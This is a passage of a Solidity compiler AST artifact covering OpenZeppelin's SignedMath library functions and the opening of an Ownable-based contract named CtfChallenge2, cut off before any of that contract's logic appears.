language."},"fullyImplemented":true,"id":5595,"linearizedBaseContracts":[5595],"name":"SignedMath","nameLocation":"266:10:8","nodeType":"ContractDefinition","nodes":[{"body":{"id":5485,"nodeType":"Block","src":"746:215:8","statements":[{"id":5484,"nodeType":"UncheckedBlock","src":"756:199:8","statements":[{"expression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5482,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5468,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5463,"src":"894:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5480,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5471,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5469,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5461,"src":"900:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":5470,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5463,"src":"904:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"900:5:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5472,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"899:7:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"arguments":[{"id":5477,"name":"condition","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5459,"src":"932:9:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":5475,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"916:8:8","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":5476,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"925:6:8","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"916:15:8","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":5478,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"916:26:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":5474,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"909:6:8","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":5473,"name":"int256","nodeType":"ElementaryTypeName","src":"909:6:8","typeDescriptions":{}}},"id":5479,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"909:34:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"899:44:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5481,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"898:46:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"894:50:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":5467,"id":5483,"nodeType":"Return","src":"887:57:8"}]}]},"documentation":{"id":5457,"nodeType":"StructuredDocumentation","src":"283:374:8","text":" @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\n IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\n However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\n one branch when needed, making this function more expensive."},"id":5486,"implemented":true,"kind":"function","modifiers":[],"name":"ternary","nameLocation":"671:7:8","nodeType":"FunctionDefinition","parameters":{"id":5464,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5459,"mutability":"mutable","name":"condition","nameLocation":"684:9:8","nodeType":"VariableDeclaration","scope":5486,"src":"679:14:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":5458,"name":"bool","nodeType":"ElementaryTypeName","src":"679:4:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":5461,"mutability":"mutable","name":"a","nameLocation":"702:1:8","nodeType":"VariableDeclaration","scope":5486,"src":"695:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5460,"name":"int256","nodeType":"ElementaryTypeName","src":"695:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"},{"constant":false,"id":5463,"mutability":"mutable","name":"b","nameLocation":"712:1:8","nodeType":"VariableDeclaration","scope":5486,"src":"705:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5462,"name":"int256","nodeType":"ElementaryTypeName","src":"705:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"678:36:8"},"returnParameters":{"id":5467,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5466,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5486,"src":"738:6:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5465,"name":"int256","nodeType":"ElementaryTypeName","src":"738:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"737:8:8"},"scope":5595,"src":"662:299:8","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5504,"nodeType":"Block","src":"1102:44:8","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5499,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5497,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5489,"src":"1127:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":5498,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5491,"src":"1131:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1127:5:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":5500,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5489,"src":"1134:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},{"id":5501,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5491,"src":"1137:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_int256","typeString":"int256"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5496,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5486,"src":"1119:7:8","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_int256_$_t_int256_$returns$_t_int256_$","typeString":"function (bool,int256,int256) pure returns (int256)"}},"id":5502,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1119:20:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":5495,"id":5503,"nodeType":"Return","src":"1112:27:8"}]},"documentation":{"id":5487,"nodeType":"StructuredDocumentation","src":"967:66:8","text":" @dev Returns the largest of two signed numbers."},"id":5505,"implemented":true,"kind":"function","modifiers":[],"name":"max","nameLocation":"1047:3:8","nodeType":"FunctionDefinition","parameters":{"id":5492,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5489,"mutability":"mutable","name":"a","nameLocation":"1058:1:8","nodeType":"VariableDeclaration","scope":5505,"src":"1051:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5488,"name":"int256","nodeType":"ElementaryTypeName","src":"1051:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"},{"constant":false,"id":5491,"mutability":"mutable","name":"b","nameLocation":"1068:1:8","nodeType":"VariableDeclaration","scope":5505,"src":"1061:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5490,"name":"int256","nodeType":"ElementaryTypeName","src":"1061:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1050:20:8"},"returnParameters":{"id":5495,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5494,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5505,"src":"1094:6:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5493,"name":"int256","nodeType":"ElementaryTypeName","src":"1094:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1093:8:8"},"scope":5595,"src":"1038:108:8","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5523,"nodeType":"Block","src":"1288:44:8","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5518,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5516,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5508,"src":"1313:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":5517,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5510,"src":"1317:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1313:5:8","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":5519,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5508,"src":"1320:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},{"id":5520,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5510,"src":"1323:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_int256","typeString":"int256"},{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5515,"name":"ternary","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5486,"src":"1305:7:8","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$_t_int256_$_t_int256_$returns$_t_int256_$","typeString":"function (bool,int256,int256) pure returns (int256)"}},"id":5521,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1305:20:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":5514,"id":5522,"nodeType":"Return","src":"1298:27:8"}]},"documentation":{"id":5506,"nodeType":"StructuredDocumentation","src":"1152:67:8","text":" @dev Returns the smallest of two signed numbers."},"id":5524,"implemented":true,"kind":"function","modifiers":[],"name":"min","nameLocation":"1233:3:8","nodeType":"FunctionDefinition","parameters":{"id":5511,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5508,"mutability":"mutable","name":"a","nameLocation":"1244:1:8","nodeType":"VariableDeclaration","scope":5524,"src":"1237:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5507,"name":"int256","nodeType":"ElementaryTypeName","src":"1237:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"},{"constant":false,"id":5510,"mutability":"mutable","name":"b","nameLocation":"1254:1:8","nodeType":"VariableDeclaration","scope":5524,"src":"1247:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5509,"name":"int256","nodeType":"ElementaryTypeName","src":"1247:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1236:20:8"},"returnParameters":{"id":5514,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5513,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5524,"src":"1280:6:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5512,"name":"int256","nodeType":"ElementaryTypeName","src":"1280:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1279:8:8"},"scope":5595,"src":"1224:108:8","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5567,"nodeType":"Block","src":"1537:162:8","statements":[{"assignments":[5535],"declarations":[{"constant":false,"id":5535,"mutability":"mutable","name":"x","nameLocation":"1606:1:8","nodeType":"VariableDeclaration","scope":5567,"src":"1599:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5534,"name":"int256","nodeType":"ElementaryTypeName","src":"1599:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"id":5548,"initialValue":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5547,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5538,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5536,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5527,"src":"1611:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"id":5537,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5529,"src":"1615:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1611:5:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5539,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1610:7:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5545,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5542,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5540,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5527,"src":"1622:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":5541,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5529,"src":"1626:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1622:5:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5543,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1621:7:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"31","id":5544,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1632:1:8","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1621:12:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5546,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1620:14:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1610:24:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"VariableDeclarationStatement","src":"1599:35:8"},{"expression":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5565,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5549,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5535,"src":"1651:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5563,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":5557,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":5554,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5535,"src":"1671:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5553,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1663:7:8","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":5552,"name":"uint256","nodeType":"ElementaryTypeName","src":"1663:7:8","typeDescriptions":{}}},"id":5555,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1663:10:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"323535","id":5556,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1677:3:8","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 255"},"value":"255"},"src":"1663:17:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":5551,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1656:6:8","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":5550,"name":"int256","nodeType":"ElementaryTypeName","src":"1656:6:8","typeDescriptions":{}}},"id":5558,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1656:25:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"&","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5561,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5559,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5527,"src":"1685:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":5560,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5529,"src":"1689:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1685:5:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5562,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1684:7:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1656:35:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5564,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"1655:37:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"1651:41:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":5533,"id":5566,"nodeType":"Return","src":"1644:48:8"}]},"documentation":{"id":5525,"nodeType":"StructuredDocumentation","src":"1338:126:8","text":" @dev Returns the average of two signed numbers without overflow.\n The result is rounded towards zero."},"id":5568,"implemented":true,"kind":"function","modifiers":[],"name":"average","nameLocation":"1478:7:8","nodeType":"FunctionDefinition","parameters":{"id":5530,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5527,"mutability":"mutable","name":"a","nameLocation":"1493:1:8","nodeType":"VariableDeclaration","scope":5568,"src":"1486:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5526,"name":"int256","nodeType":"ElementaryTypeName","src":"1486:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"},{"constant":false,"id":5529,"mutability":"mutable","name":"b","nameLocation":"1503:1:8","nodeType":"VariableDeclaration","scope":5568,"src":"1496:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5528,"name":"int256","nodeType":"ElementaryTypeName","src":"1496:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1485:20:8"},"returnParameters":{"id":5533,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5532,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5568,"src":"1529:6:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5531,"name":"int256","nodeType":"ElementaryTypeName","src":"1529:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1528:8:8"},"scope":5595,"src":"1469:230:8","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":5593,"nodeType":"Block","src":"1843:767:8","statements":[{"id":5592,"nodeType":"UncheckedBlock","src":"1853:751:8","statements":[{"assignments":[5577],"declarations":[{"constant":false,"id":5577,"mutability":"mutable","name":"mask","nameLocation":"2424:4:8","nodeType":"VariableDeclaration","scope":5592,"src":"2417:11:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5576,"name":"int256","nodeType":"ElementaryTypeName","src":"2417:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"id":5581,"initialValue":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5580,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5578,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5571,"src":"2431:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"323535","id":5579,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2436:3:8","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 255"},"value":"255"},"src":"2431:8:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"VariableDeclarationStatement","src":"2417:22:8"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5589,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":5586,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5584,"name":"n","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5571,"src":"2576:1:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"id":5585,"name":"mask","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5577,"src":"2580:4:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"2576:8:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":5587,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"2575:10:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"id":5588,"name":"mask","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5577,"src":"2588:4:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"2575:17:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":5583,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2567:7:8","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":5582,"name":"uint256","nodeType":"ElementaryTypeName","src":"2567:7:8","typeDescriptions":{}}},"id":5590,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2567:26:8","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":5575,"id":5591,"nodeType":"Return","src":"2560:33:8"}]}]},"documentation":{"id":5569,"nodeType":"StructuredDocumentation","src":"1705:78:8","text":" @dev Returns the absolute unsigned value of a signed value."},"id":5594,"implemented":true,"kind":"function","modifiers":[],"name":"abs","nameLocation":"1797:3:8","nodeType":"FunctionDefinition","parameters":{"id":5572,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5571,"mutability":"mutable","name":"n","nameLocation":"1808:1:8","nodeType":"VariableDeclaration","scope":5594,"src":"1801:8:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":5570,"name":"int256","nodeType":"ElementaryTypeName","src":"1801:6:8","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1800:10:8"},"returnParameters":{"id":5575,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5574,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5594,"src":"1834:7:8","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5573,"name":"uint256","nodeType":"ElementaryTypeName","src":"1834:7:8","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1833:9:8"},"scope":5595,"src":"1788:822:8","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":5596,"src":"258:2354:8","usedErrors":[],"usedEvents":[]}],"src":"109:2504:8"},"id":8},"contracts/CtfChallenge2.sol":{"ast":{"absolutePath":"contracts/CtfChallenge2.sol","exportedSymbols":{"CtfChallenge2":[5624],"ITarget":[5628],"Ownable":[147]},"id":5629,"license":"UNLICENSED","nodeType":"SourceUnit","nodes":[{"id":5597,"literals":["solidity","^","0.8",".28"],"nodeType":"PragmaDirective","src":"39:24:9"},{"absolutePath":"@openzeppelin/contracts/access/Ownable.sol","file":"@openzeppelin/contracts/access/Ownable.sol","id":5599,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":5629,"sourceUnit":148,"src":"64:67:9","symbolAliases":[{"foreign":{"id":5598,"name":"Ownable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":147,"src":"72:7:9","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[{"baseName":{"id":5600,"name":"Ownable","nameLocations":["235:7:9"],"nodeType":"IdentifierPath","referencedDeclaration":147,"src":"235:7:9"},"id":5601,"nodeType":"InheritanceSpecifier","src":"235:7:9"}],"canonicalName":"CtfChallenge2","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":5624,"linearizedBaseContracts":[5624,147,177],"name":"CtfChallenge2","nameLocation":"218:13:9","nodeType":"ContractDefinition","nodes":[{"body":{"id":5608,"nodeType":"Block","src":"281:2:9","statements":[]},"id":5609,"implemented":true,"kind":"